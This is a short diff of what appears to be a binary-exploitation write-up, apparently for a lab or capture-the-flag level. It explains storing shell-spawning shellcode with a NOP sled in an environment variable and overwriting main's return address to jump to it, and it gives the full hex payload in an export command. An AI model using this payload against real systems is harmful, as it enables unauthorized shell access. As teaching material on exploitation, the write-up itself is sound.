@@ -5,8 +5,10 @@ instead of using a `ret2libc` attack with system, we can use a shellcode stored 
 we will put a shellcode (assembly instructions in hex format, the kind used by any program when loaded in memory) in a environment variable, and redirect the main's return address to the environment variable's address.
 
 shellcode found on https://axcheron.github.io/linux-shellcode-101-from-hell-to-shell/.
+
 `export code=$(python -c "print('\x90'*8 + '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80')")`
-a simple C program to get the address of the environment variable:
+
+and simple C program to get the address of the environment variable:
 
 ```c
 #include <stdio.h>
